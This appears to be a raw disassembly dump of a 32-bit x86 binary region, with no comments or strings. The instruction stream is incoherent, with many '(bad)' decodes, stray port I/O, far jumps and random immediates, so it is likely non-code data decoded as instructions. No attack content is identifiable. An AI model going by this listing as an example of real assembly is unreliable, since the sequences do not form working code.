  41c7ba:	dec    ebp
  41c7bb:	xchg   esi,eax
  41c7bc:	je     0x41c827
  41c7be:	xchg   edx,eax
  41c7bf:	dec    esi
  41c7c0:	sub    al,0x1c
  41c7c2:	jle    0x41c7fd
  41c7c4:	icebp  
  41c7c5:	adc    dl,BYTE PTR [esi+0x3b]
  41c7c8:	leave  
  41c7c9:	push   cs
  41c7ca:	je     0x41c80b
  41c7cc:	int3   
  41c7cd:	mov    ds:0xebee46d6,eax
  41c7d2:	nop
  41c7d3:	sbb    DWORD PTR [eax-0x210b3478],edi
  41c7d9:	(bad)  
  41c7da:	ss xchg bp,ax
  41c7dd:	or     BYTE PTR [esi],ch
  41c7df:	inc    ebp
  41c7e0:	cwde   
  41c7e1:	int    0x23
  41c7e3:	or     dh,ah
  41c7e5:	dec    edi
  41c7e6:	call   0x9a5a3312
  41c7eb:	iret   
  41c7ec:	ror    esi,cl
  41c7ee:	or     eax,0xf1cf4641
  41c7f3:	daa    
  41c7f4:	mov    ah,0xf9
  41c7f6:	inc    edx
  41c7f7:	xchg   esi,eax
  41c7f8:	sbb    al,0x48
  41c7fa:	adc    bl,BYTE PTR [eax-0x13]
  41c7fd:	add    BYTE PTR [esi-0x27c0e87a],0xcb
  41c804:	dec    edi
  41c805:	add    al,0xd3
  41c807:	jle    0x41c795
  41c809:	lock add bh,BYTE PTR [edi-0x6f]
  41c80d:	ret    
  41c80e:	lea    bx,[edx+0x1c941216]
  41c815:	loope  0x41c803
  41c817:	sbb    al,BYTE PTR [ecx-0x74]
  41c81a:	out    0x6e,eax
  41c81c:	inc    ebp
  41c81d:	test   BYTE PTR [ebx-0x59187841],cl
  41c823:	cmp    eax,0x19fd86da
  41c828:	mov    al,ds:0x1679521
  41c82d:	mov    cl,0x9
  41c82f:	push   0x1d
  41c831:	int3   
  41c832:	outs   dx,BYTE PTR ds:[esi]
  41c833:	mov    dl,0xa6
  41c835:	pusha  
  41c836:	leave  
  41c837:	shl    DWORD PTR [eax-0x2b2211cc],cl
  41c83d:	popa   
  41c83e:	ds in  al,0x8b
  41c841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c842:	or     DWORD PTR [ecx+0x56],esi
  41c845:	gs cdq 
  41c847:	add    al,0xd6
  41c849:	mov    DWORD PTR [eax],ebx
  41c84b:	sbb    eax,0xb05f5355
  41c850:	int3   
  41c851:	xor    eax,0xfb87f1df
  41c856:	add    bh,BYTE PTR [eax+0x2377f16f]
  41c85c:	rcr    BYTE PTR ss:[ecx+ebx*8],cl
  41c860:	mov    bh,0xf9
  41c862:	pop    edi
  41c863:	in     eax,0x98
  41c865:	loope  0x41c8d2
  41c867:	mov    al,ds:0xdc84d149
  41c86c:	test   cl,0x74
  41c86f:	iret   
  41c870:	or     bl,BYTE PTR [esp+0x36e7d65f]
  41c877:	jne    0x41c894
  41c879:	jge    0x41c83a
  41c87b:	lods   eax,DWORD PTR ds:[esi]
  41c87c:	scas   eax,DWORD PTR es:[edi]
  41c87d:	mov    bl,dh
  41c87f:	call   0x746a:0xf8e382b0
  41c886:	and    ebx,eax
  41c888:	push   esi
  41c889:	and    al,0xb4
  41c88b:	into   
  41c88c:	iret   
  41c88d:	iret   
  41c88e:	mov    bl,0xc
	...
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [esi+0x4c043bc8],edi
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	popf   
  41c90d:	sub    al,0xe6
  41c90f:	jnp    0x41c8fb
  41c911:	shl    DWORD PTR [ebp+0x48ad029b],cl
  41c917:	or     eax,0x7efaf231
  41c91c:	retf   0xab15
  41c91f:	jge    0x41c8ff
  41c921:	fbld   TBYTE PTR [ebx]
  41c923:	enter  0x88a,0xe4
  41c927:	jns    0x41c8eb
  41c929:	mov    dl,0xd3
  41c92b:	and    al,0x9a
  41c92d:	dec    ebx
  41c92e:	mov    cl,0x7f
  41c930:	ret    
  41c931:	loop   0x41c9a0
  41c933:	scas   al,BYTE PTR es:[edi]
  41c934:	(bad)  
  41c935:	ins    BYTE PTR es:[edi],dx
  41c936:	loopne 0x41c9b7
  41c938:	clc    
  41c939:	(bad)  
  41c93b:	cwde   
  41c93c:	adc    al,0x7d
  41c93e:	dec    edi
  41c93f:	shl    DWORD PTR [ebx],1
  41c941:	push   ecx
  41c942:	je     0x41c90c
  41c944:	jno    0x41c953
  41c946:	je     0x41c97f
  41c948:	push   es
  41c949:	cli    
  41c94a:	xchg   esp,eax
  41c94b:	lods   al,BYTE PTR ds:[esi]
  41c94c:	ret    0x7d77
  41c94f:	mov    dh,0x16
  41c951:	in     al,0x59
  41c953:	cmp    DWORD PTR [ebx+0x2f561d8d],0xdc57587f
  41c95d:	out    0x31,eax
  41c95f:	pusha  
  41c960:	cmp    eax,0xe0456ee3
  41c965:	dec    ebx
  41c966:	sub    DWORD PTR [ebx+0x1d],0xcd2cae4e
  41c96d:	jns    0x41c9c1
  41c96f:	and    ah,ch
  41c971:	jmp    0x41c9e6
  41c973:	mov    eax,ds:0xaf110faa
  41c978:	into   
  41c979:	dec    esp
  41c97a:	xchg   ecx,eax
  41c97b:	data16 addr16 (bad) 
  41c97e:	pop    eax
  41c97f:	sbb    ah,BYTE PTR [ecx+eax*2]
  41c982:	xchg   esi,eax
  41c983:	mov    ebp,0x5ca0319
  41c988:	dec    edx
  41c989:	mov    edx,0x97d3ddf7
  41c98e:	or     eax,0xee225655
  41c993:	mov    sp,0xa2ea
  41c997:	cld    
  41c998:	dec    ecx
  41c999:	mov    esi,0x5cb00bf3
  41c99e:	pop    ebp
  41c99f:	je     0x41c99e
  41c9a1:	fcmovu st,st(6)
  41c9a3:	mov    dl,0x7c
  41c9a5:	push   ds
  41c9a6:	push   edi
  41c9a7:	push   es
  41c9a8:	dec    esp
  41c9a9:	xchg   ecx,eax
  41c9aa:	pop    edx
  41c9ab:	stos   DWORD PTR es:[edi],eax
  41c9ac:	mov    DWORD PTR [edx],ebp
  41c9ae:	push   ss
  41c9af:	mov    edi,0x383a816a
  41c9b4:	mov    esi,0xbceb86bf
  41c9b9:	and    BYTE PTR [ebx],ah
  41c9bb:	out    dx,eax
  41c9bc:	push   ecx
  41c9bd:	fdivr  st,st(0)
  41c9bf:	pop    es
  41c9c0:	into   
  41c9c1:	push   ebp
  41c9c2:	mov    ebp,0xe94b81f0
  41c9c7:	pop    esi
  41c9c8:	int    0xaf
  41c9ca:	xchg   esp,eax
  41c9cb:	dec    ebx
  41c9cc:	xor    BYTE PTR [ebp+0x27],0x7c
  41c9d0:	ins    BYTE PTR es:[edi],dx
  41c9d1:	(bad)  
  41c9d2:	hlt    
  41c9d3:	push   edi
  41c9d4:	jne    0x41c9e5
  41c9d6:	(bad)  
  41c9d7:	into   
  41c9d8:	sub    al,0xcc
  41c9da:	lods   eax,DWORD PTR ds:[esi]
  41c9db:	in     al,dx
  41c9dc:	aam    0xa4
  41c9de:	sub    dl,dl
  41c9e0:	fwait
  41c9e1:	stos   DWORD PTR es:[edi],eax
  41c9e2:	dec    ecx
  41c9e3:	lock or ecx,DWORD PTR [esi]
  41c9e6:	push   ecx
  41c9e7:	sbb    al,0x52
  41c9e9:	rcr    BYTE PTR [esi+edi*1-0x433e3d76],cl
  41c9f0:	enter  0x40f0,0x9
  41c9f4:	shr    BYTE PTR [eax-0x2c6b0c19],1
  41c9fa:	arpl   WORD PTR [ecx+0x2ff5f857],di
  41ca00:	pop    ebx
  41ca01:	pop    es
  41ca02:	neg    esi
  41ca04:	xor    eax,0xa382634e
  41ca09:	jmp    0x41c99e
  41ca0b:	retf   0x29fe
  41ca0e:	int    0x5
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	mov    bl,0x8c
  41ca82:	data16 or BYTE PTR [eax+0x30],dl
  41ca86:	add    DWORD PTR [eax],eax
  41ca88:	add    al,0x1
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	xchg   ebp,eax
  41ca8d:	cmp    ecx,edi
  41ca8f:	and    al,0x25
  41ca91:	(bad)  
  41ca93:	shl    DWORD PTR [edi],cl
  41ca95:	jmp    0x3c1d:0xd477ff7a
  41ca9c:	mov    esi,0xf161169b
  41caa1:	ins    DWORD PTR es:[edi],dx
  41caa2:	xchg   ecx,eax
  41caa3:	pop    es
  41caa4:	dec    ebp
  41caa5:	mov    ds:0x2ae89cd8,al
  41caaa:	sub    al,0xfe
  41caac:	mov    edx,0x7b2325ff
  41cab1:	inc    ebx
  41cab2:	jne    0x41caf5
  41cab4:	(bad)  
  41cab5:	mov    BYTE PTR [edx+0x77861d83],cl
  41cabb:	hlt    
  41cabc:	in     al,0xa7
  41cabe:	jecxz  0x41ca90
  41cac0:	push   0x58
  41cac2:	out    dx,al
  41cac3:	xchg   edi,eax
  41cac4:	call   0x72fd166d
  41cac9:	iret   
  41caca:	sbb    BYTE PTR [ebp-0x75],bh
  41cacd:	scas   eax,DWORD PTR es:[edi]
  41cace:	xchg   edx,eax
  41cacf:	push   ebp
  41cad0:	pop    es
  41cad1:	int3   
  41cad2:	xor    edi,ecx
  41cad4:	rcl    BYTE PTR [eax+0x5879cc82],cl
  41cada:	mov    al,ds:0x10adcf59
  41cadf:	xlat   BYTE PTR ds:[ebx]
  41cae0:	cmp    ah,ch
  41cae2:	sub    BYTE PTR [ecx+0x3],0xd7
  41cae6:	in     eax,0xae
  41cae8:	or     ch,BYTE PTR [edi-0x23bb54bd]
  41caee:	jecxz  0x41caa6
  41caf0:	pop    esi
  41caf1:	(bad)  
  41caf3:	inc    edi
  41caf4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41caf6:	mov    esi,ds
  41caf8:	and    eax,DWORD PTR [esi+0x32ca760b]
  41cafe:	imul   ebx,DWORD PTR [ebp+ebp*2+0x4da1dabb],0x372d782e
  41cb09:	in     al,0x17
  41cb0b:	stos   DWORD PTR es:[edi],eax
  41cb0c:	and    cl,BYTE PTR [esi+0x32817b61]
  41cb12:	les    ebx,FWORD PTR [ebp+0x21]
  41cb15:	pop    edi
  41cb16:	xlat   BYTE PTR ds:[ebx]
  41cb17:	adc    al,0xf8
  41cb19:	add    BYTE PTR [esp+ecx*2-0x2f],dl
  41cb1d:	dec    eax
  41cb1e:	xor    edx,DWORD PTR [edi-0x3e]
  41cb21:	push   ds
  41cb22:	dec    ecx
  41cb23:	sti    
  41cb24:	ds xchg edi,eax
  41cb26:	pop    ecx
  41cb27:	pushf  
  41cb28:	mov    ebx,0xa02371c9
  41cb2d:	xchg   esp,eax
  41cb2e:	nop
  41cb2f:	xchg   edi,ebx
  41cb31:	bnd jle 0x41cabb
  41cb34:	in     eax,0x55
  41cb36:	mov    ecx,0x4a791ac2
  41cb3b:	(bad)  
  41cb3c:	in     eax,0xbe
  41cb3e:	mov    ebx,0x80fbae3a
  41cb43:	dec    ecx
  41cb44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb45:	adc    eax,0xe3593770
  41cb4a:	pop    es
  41cb4b:	inc    edi
  41cb4c:	rcr    al,cl
  41cb4e:	xor    ebx,DWORD PTR [ebp-0x3a118733]
  41cb54:	inc    edi
  41cb55:	xchg   ebx,eax
  41cb56:	cmp    DWORD PTR [ecx+edx*1],eax
  41cb59:	mov    eax,0xb78c96d3
  41cb5e:	jo     0x41cafa
  41cb60:	mov    ebp,0x93246e0e
  41cb65:	mov    eax,0x160c6ded
  41cb6a:	mov    esp,DWORD PTR [ebp-0x4f255824]
  41cb70:	loopne 0x41cb92
  41cb72:	pushf  
  41cb73:	out    0xee,al
  41cb75:	jmp    0x5d835197
  41cb7a:	stos   BYTE PTR es:[edi],al
  41cb7b:	xor    BYTE PTR [ebx-0x2f],0xd3
  41cb7f:	pop    esi
  41cb80:	adc    dl,BYTE PTR [eax]
  41cb82:	fbld   TBYTE PTR [esi]
  41cb84:	cli    
  41cb85:	leave  
  41cb86:	sbb    al,0x6e
  41cb88:	push   eax
  41cb89:	cwde   
  41cb8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb8b:	xchg   ebp,eax
  41cb8c:	mov    esi,0xa8d752
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x6f775422
  41cc03:	pop    ebp
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	and    ebp,edx
  41cc0e:	sbb    BYTE PTR [ecx-0x37],ah
  41cc11:	jge    0x41cc13
  41cc13:	add    DWORD PTR [ecx-0x17],0xffffffc1
  41cc17:	mov    ds:0x61512b64,al
  41cc1c:	add    eax,0x22325d33
  41cc21:	mov    DWORD PTR [ebx-0x7e1a3398],esp
  41cc27:	imul   ecx,DWORD PTR [eax+0x24],0x5c
  41cc2b:	pop    edi
  41cc2c:	jno    0x41cc41
  41cc2e:	push   ebp
  41cc2f:	push   edi
  41cc30:	xlat   BYTE PTR ds:[ebx]
  41cc31:	dec    edi
  41cc32:	cld    
  41cc33:	cmp    al,0x69
  41cc35:	in     al,dx
  41cc36:	retf   0x46b6
  41cc39:	cwde   
  41cc3a:	and    edi,DWORD PTR [esi-0x656d780b]
  41cc40:	xor    al,0xc4
  41cc42:	jle    0x41cc3a
  41cc44:	scas   al,BYTE PTR es:[edi]
  41cc45:	cdq    
  41cc46:	call   0x80e7b41a
  41cc4b:	les    ebx,FWORD PTR [ebx-0x23]
  41cc4e:	mov    ah,0x35
  41cc50:	imul   ecx,DWORD PTR [edi],0x51
  41cc53:	adc    al,0xe9
  41cc55:	lock repnz adc esp,DWORD PTR [edi]
  41cc59:	push   ds
  41cc5a:	mov    al,0xe7
  41cc5c:	cmp    ch,BYTE PTR [ebp-0x70]
  41cc5f:	test   DWORD PTR [ebx+eiz*2-0x4cd1e583],ebp
  41cc66:	imul   edi,DWORD PTR [ebx-0x4d],0x6cc0171b
  41cc6d:	aas    
  41cc6e:	imul   ebx,DWORD PTR [ecx+0x18c0732a],0xdb763cf
  41cc78:	div    DWORD PTR [ebp-0x640cdb42]
  41cc7e:	retf   0x1f54
  41cc81:	mov    dl,0x80
  41cc83:	loope  0x41ccd2
  41cc85:	pop    esp
  41cc86:	sbb    dh,al
  41cc88:	jns    0x41cc18
  41cc8a:	in     al,0xa
  41cc8c:	aad    0x7f
  41cc8e:	adc    ch,BYTE PTR [ecx-0x53]
  41cc91:	inc    edx
  41cc92:	mov    bl,0xae
  41cc94:	mov    dh,0x74
  41cc96:	loop   0x41cca0
  41cc98:	outs   dx,BYTE PTR ds:[esi]
  41cc99:	in     al,dx
  41cc9a:	fninit 
  41cc9c:	js     0x41cc6a
  41cc9e:	ret    0xbd74
  41cca1:	xlat   BYTE PTR ds:[ebx]
  41cca2:	xchg   esi,eax
  41cca3:	or     esi,esp
  41cca5:	ja     0x41cc55
  41cca7:	mov    edi,?
  41cca9:	push   edi
  41ccaa:	lock dec eax
  41ccac:	fst    DWORD PTR [ebx-0x73e60bec]
  41ccb2:	jp     0x41cc6d
  41ccb4:	sar    DWORD PTR [edi],1
  41ccb6:	(bad)  
  41ccb7:	mov    ebp,0x749e0ef0
  41ccbc:	cmp    BYTE PTR [ebx+edx*4+0x23],al
  41ccc0:	jmp    0xd8b5:0x6a3bbc67
  41ccc7:	loope  0x41cc79
  41ccc9:	(bad)  
  41ccca:	jmp    0xac73:0xbb48c369
  41ccd1:	daa    
  41ccd2:	scas   eax,DWORD PTR es:[edi]
  41ccd3:	push   edi
  41ccd4:	jg     0x41cd4c
  41ccd6:	scas   al,BYTE PTR es:[edi]
  41ccd7:	pop    edx
  41ccd8:	inc    eax
  41ccd9:	xchg   esi,eax
  41ccda:	call   0x41d84ba0
  41ccdf:	fistp  DWORD PTR [ebx+0x1c]
  41cce2:	scas   al,BYTE PTR es:[edi]
  41cce3:	test   si,ax
  41cce6:	xchg   edi,eax
  41cce7:	jecxz  0x41cc6e
  41cce9:	mov    edx,0x1e761aa9
  41ccee:	push   ds
  41ccef:	je     0x41cd6e
  41ccf1:	arpl   WORD PTR [ebx+ecx*8-0x31df9ab],si
  41ccf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccf9:	push   edi
  41ccfa:	cs sub ch,0xd1
  41ccfe:	and    BYTE PTR [edi-0x45ed71d2],ch
  41cd04:	inc    ecx
  41cd05:	mov    bl,0x10
  41cd07:	mov    ch,0xe4
  41cd09:	cdq    
  41cd0a:	dec    ebx
  41cd0b:	stos   BYTE PTR es:[edi],al
  41cd0c:	ds xchg ecx,eax
  41cd0e:	add    bl,BYTE PTR [ecx]
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	fnstenv [ebp+0x32585d1f]
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	mov    ch,0xdd
  41cd8e:	mov    bl,0x70
  41cd90:	sub    DWORD PTR [esi+0x6f],ecx
  41cd93:	imul   ebx,DWORD PTR [ebx],0x3a
  41cd96:	mov    esi,0xe1c64029
  41cd9b:	scas   eax,DWORD PTR es:[edi]
  41cd9c:	mov    edi,0xd2dd929b
  41cda1:	sub    eax,0xce9b1d4a
  41cda6:	out    dx,eax
  41cda7:	jmp    0xdb4c:0x74bd3079
  41cdae:	cmp    eax,0x9f6579bf
  41cdb3:	dec    ecx
  41cdb4:	adc    BYTE PTR [edx-0x57],0x83
  41cdb8:	scas   al,BYTE PTR es:[edi]
  41cdb9:	jb     0x41cdcf
  41cdbb:	pop    ebp
  41cdbc:	push   0x847970be
  41cdc1:	ss push edi
  41cdc3:	outs   dx,DWORD PTR ds:[esi]
  41cdc4:	imul   DWORD PTR [ebx-0x4b]
  41cdc7:	dec    ecx
  41cdc8:	sub    BYTE PTR [ecx-0x5b],ah
  41cdcb:	mov    WORD PTR [ebp+edx*2+0x58],?
  41cdcf:	cmp    eax,0x3825f168
  41cdd4:	sub    BYTE PTR [ebx-0xc],ah
  41cdd7:	adc    BYTE PTR [ebp+0x6e],ah
  41cdda:	or     eax,0x2ee47371
  41cddf:	imul   edi,DWORD PTR [ecx+0x19],0xd80e9537
  41cde6:	inc    esi
  41cde7:	repz ficom WORD PTR [esi-0x6d]
  41cdeb:	and    al,0xbf
  41cded:	cwde   
  41cdee:	or     eax,0x69a66cb4
  41cdf3:	cmp    eax,0x9c39b973
  41cdf8:	pop    edx
  41cdf9:	mov    esp,0xec1e85f0
  41cdfe:	scas   al,BYTE PTR es:[edi]
  41cdff:	pop    esp
  41ce00:	push   0xffffffa2
  41ce02:	mov    eax,ds:0xe953e931
  41ce07:	out    0xc0,eax
  41ce09:	outs   dx,DWORD PTR ds:[esi]
  41ce0a:	ds jne 0x41cdbd
  41ce0d:	mov    ?,WORD PTR [edx-0x29]
  41ce10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce11:	loop   0x41ce90
  41ce13:	xor    al,0xb3
  41ce15:	int    0xff
  41ce17:	mov    edi,esi
  41ce19:	push   ebx
  41ce1a:	pop    esi
  41ce1b:	test   BYTE PTR [edi+0x4df44862],al
  41ce21:	lahf   
  41ce22:	jle    0x41ce86
  41ce24:	cmp    ebp,DWORD PTR [ecx-0x6f]
  41ce27:	adc    al,0xc0
  41ce29:	rcl    BYTE PTR gs:[esp+esi*8-0x60],0xc8
  41ce2f:	shl    DWORD PTR [edi],cl
  41ce31:	push   esi
  41ce32:	pop    esi
  41ce33:	sbb    BYTE PTR [ebx-0x49],dl
  41ce36:	sbb    al,0xf5
  41ce38:	sub    ah,BYTE PTR [edi-0x688b37bd]
  41ce3e:	idiv   DWORD PTR [edi+0x15537d9b]
  41ce44:	fst    QWORD PTR [ecx-0x7d]
  41ce47:	lock repz jl 0x41ce1e
  41ce4b:	jb     0x41cddd
  41ce4d:	xchg   ecx,eax
  41ce4e:	jmp    0x92bc0f2
  41ce53:	xchg   ebp,eax
  41ce54:	xchg   esi,eax
  41ce55:	imul   DWORD PTR [ebx+0x2e1dc077]
  41ce5b:	jge    0x41ce62
  41ce5d:	call   0xe245486f
  41ce62:	pusha  
  41ce63:	jno    0x41ce8b
  41ce65:	pop    edi
  41ce66:	test   DWORD PTR [ecx-0x12ad5e54],eax
  41ce6c:	mov    esp,0x7067e594
  41ce71:	or     eax,DWORD PTR [eax]
  41ce73:	pop    ecx
  41ce74:	repz popf 
  41ce76:	retf   
  41ce77:	pusha  
  41ce78:	cmp    esi,eax
  41ce7a:	dec    ebx
  41ce7b:	dec    ebx
  41ce7c:	nop
  41ce7d:	xchg   ebx,eax
  41ce7e:	in     eax,0x95
  41ce80:	adc    al,0x59
  41ce82:	jle    0x41ce99
  41ce84:	out    dx,al
  41ce85:	lock xor bl,0x11
  41ce89:	jmp    0x41cede
  41ce8b:	mov    al,ds:0xfbcdf674
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	test   BYTE PTR ds:0x335c213b,dl
  41cf06:	add    DWORD PTR [eax],eax
  41cf08:	add    al,0x1
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	mov    edx,0xe7e711ab
  41cf11:	inc    edx
  41cf12:	xchg   BYTE PTR [eax-0x72e46d9d],dl
  41cf18:	(bad)  
  41cf19:	adc    ebp,DWORD PTR [ecx]
  41cf1b:	idiv   BYTE PTR [edx-0x6ba02326]
  41cf21:	fsubr  st(7),st
  41cf23:	mov    DWORD PTR [eax-0x65],eax
  41cf26:	mov    DWORD PTR [ebx],ebp
  41cf28:	addr16 xchg edx,eax
  41cf2a:	sar    BYTE PTR [esi+0x436660c9],cl
  41cf30:	dec    eax
  41cf31:	stc    
  41cf32:	or     eax,0x264edf8e
  41cf37:	push   eax
  41cf38:	mov    bl,al
  41cf3a:	mov    ecx,gs
  41cf3c:	jae    0x41cec2
  41cf3e:	mov    eax,ecx
  41cf40:	cmp    esp,DWORD PTR [edx+0x670eb3fa]
  41cf46:	rcr    DWORD PTR [eax+0x17e80bbe],0xfa
  41cf4d:	pop    ss
  41cf4e:	call   0x1e9b:0xd418b00b
  41cf55:	mov    ebx,0xa9bc3257
  41cf5a:	or     eax,0x7305bc4d
  41cf5f:	test   cl,ah
  41cf61:	mov    bl,0xc0
  41cf63:	jae    0x41cf03
  41cf65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf66:	mov    al,0x68
  41cf68:	push   ebp
  41cf69:	inc    ecx
  41cf6a:	xchg   ebp,eax
  41cf6b:	jge    0x41cf6e
  41cf6d:	loopne 0x41cf98
  41cf6f:	push   esp
  41cf70:	test   BYTE PTR [esi],bh
  41cf72:	push   edx
  41cf73:	aad    0xd0
  41cf75:	pusha  
  41cf76:	setne  BYTE PTR [eax-0x32]
  41cf7a:	nop
  41cf7b:	out    0x14,al
  41cf7d:	fisubr WORD PTR [eax+0x72]
  41cf80:	cwde   
  41cf81:	jae    0x41cfb5
  41cf83:	js     0x41cf17
  41cf85:	stos   BYTE PTR es:[edi],al
  41cf86:	scas   eax,DWORD PTR es:[edi]
  41cf87:	lea    esi,[eax-0x3a]
  41cf8a:	retf   
  41cf8b:	jle    0x41cfe0
  41cf8d:	and    al,0x9b
  41cf8f:	shr    DWORD PTR [eax-0x25536bd8],0x76
  41cf96:	push   edx
  41cf97:	or     ch,BYTE PTR [eax+esi*1-0x714ef718]
  41cf9e:	cmp    ah,BYTE PTR [ebx+0x5b]
  41cfa1:	adc    esi,DWORD PTR [esi]
  41cfa3:	adc    cl,BYTE PTR [ecx+edi*2]
  41cfa6:	mov    WORD PTR [esi+0x6a205199],cs
  41cfac:	movq   mm2,QWORD PTR [edi+ecx*1+0x52331fda]
  41cfb4:	sar    DWORD PTR [eax-0x2f],1
  41cfb7:	ficom  WORD PTR [edi]
  41cfb9:	pop    es
  41cfba:	add    al,0xa8
  41cfbc:	rcr    DWORD PTR [ecx+eiz*4+0x68],0xb0
  41cfc1:	and    al,0xd1
  41cfc3:	xor    DWORD PTR [edi-0x4a],0x7a667a0f
  41cfca:	outs   dx,DWORD PTR cs:[esi]
  41cfcc:	push   esp
  41cfcd:	pop    ebx
  41cfce:	in     al,0x8
  41cfd0:	test   eax,0x769778a3
  41cfd5:	pop    ss
  41cfd6:	cdq    
  41cfd7:	xchg   esp,eax
  41cfd8:	xor    BYTE PTR [edi-0x2f],bl
  41cfdb:	out    0x8d,eax
  41cfdd:	out    dx,eax
  41cfde:	aaa    
  41cfdf:	in     eax,dx
  41cfe0:	mov    dh,0x85
  41cfe2:	jmp    0x3265:0x53f76e
  41cfe9:	push   ss
  41cfea:	test   DWORD PTR [ebx-0x7ad1ee9f],edx
  41cff0:	mov    ebp,0xd828c42d
  41cff5:	aaa    
  41cff6:	dec    eax
  41cff7:	sub    bl,BYTE PTR [ebx-0x48]
  41cffa:	mov    al,0x83
  41cffc:	fcmovnbe st,st(0)
  41cffe:	outs   dx,DWORD PTR ds:[esi]
  41cfff:	xchg   BYTE PTR [ecx],ah
  41d001:	(bad)  
  41d002:	rcl    BYTE PTR [ecx-0x61],cl
  41d005:	adc    BYTE PTR [ecx+0x2b120e7d],ch
  41d00b:	xchg   DWORD PTR [ebx+0xd0c604],ebx
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xc40e58bd
  41d083:	(bad)  
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	je     0x41d07d
  41d08e:	sub    BYTE PTR [edx-0x2],dl
  41d091:	add    eax,ecx
  41d093:	xchg   edi,eax
  41d094:	jmp    0x8ef7:0x80dbfa74
  41d09b:	repnz cwde 
  41d09d:	xchg   ecx,eax
  41d09e:	add    esp,esp
  41d0a0:	jae    0x41d113
  41d0a2:	cmp    eax,0x326c21a2
  41d0a7:	push   esp
  41d0a8:	cmc    
  41d0a9:	fstp   DWORD PTR ds:0x85f331e2
  41d0af:	sub    eax,0xb7a54c9f
  41d0b4:	das    
  41d0b5:	aad    0xbb
  41d0b7:	push   edi
  41d0b8:	data16 fiadd WORD PTR [eax+0x3f870f35]
  41d0bf:	out    dx,eax
  41d0c0:	mov    ds:0x3f958a09,al
  41d0c5:	mov    ds:0x8a27b2ca,eax
  41d0ca:	jmp    0x38d4d956
  41d0cf:	outs   dx,DWORD PTR ds:[esi]
  41d0d0:	aad    0x32
  41d0d2:	and    edi,DWORD PTR [edi+ecx*1]
  41d0d5:	outs   dx,DWORD PTR ds:[esi]
  41d0d7:	fidiv  DWORD PTR [eax+edx*8]
  41d0da:	(bad)  
  41d0db:	mov    ah,0x8b
  41d0dd:	adc    eax,0xfa2f3d6e
  41d0e2:	jecxz  0x41d122
  41d0e4:	jns    0x41d11d
  41d0e6:	jle    0x41d100
  41d0e8:	add    DWORD PTR [eax+0x50],ebp
  41d0eb:	inc    ebp
  41d0ec:	push   es
  41d0ed:	jle    0x41d15f
  41d0ef:	daa    
  41d0f0:	sbb    eax,0xcda4867e
  41d0f5:	cli    
  41d0f6:	mov    fs,WORD PTR [ebp-0xd]
  41d0f9:	scas   eax,DWORD PTR es:[edi]
  41d0fa:	int    0x11
  41d0fc:	int3   
  41d0fd:	mov    bh,0x9d
  41d0ff:	xlat   BYTE PTR ds:[ebx]
  41d100:	popa   
  41d101:	mov    ds,edi
  41d103:	mov    ebx,0xb3861666
  41d108:	gs and cl,ah
  41d10b:	pop    esi
  41d10c:	add    al,BYTE PTR [esi-0x24cda03c]
  41d112:	std    
  41d113:	cli    
  41d114:	into   
  41d115:	(bad)  
  41d116:	aas    
  41d117:	adc    dl,BYTE PTR [ecx+0x15]
  41d11a:	sbb    ecx,DWORD PTR [bx+si-0x31]
  41d11e:	cs aam 0xb3
  41d121:	in     eax,dx
  41d122:	jae    0x41d195
  41d124:	ret    0xf247
  41d127:	push   esp
  41d128:	xchg   ecx,eax
  41d129:	rcr    DWORD PTR ds:0x4e873d42,cl
  41d12f:	mov    edx,DWORD PTR [ebp-0x7e]
  41d132:	test   ah,ch
  41d134:	in     al,dx
  41d135:	ds xchg ebx,eax
  41d137:	sbb    DWORD PTR [edx+eiz*1+0x68fd07fc],edi
  41d13e:	shr    BYTE PTR [eax+0x78],1
  41d141:	cmp    ah,0x58
  41d144:	data16 (bad) 
  41d146:	ins    DWORD PTR es:[edi],dx
  41d147:	jge    0x41d19b
  41d149:	mov    eax,DWORD PTR [edx-0x342febe7]
  41d14f:	vshufpd ymm0,ymm2,ymm0,0x1e
  41d154:	jecxz  0x41d1bf
  41d156:	add    al,0x34
  41d158:	mov    bh,0x70
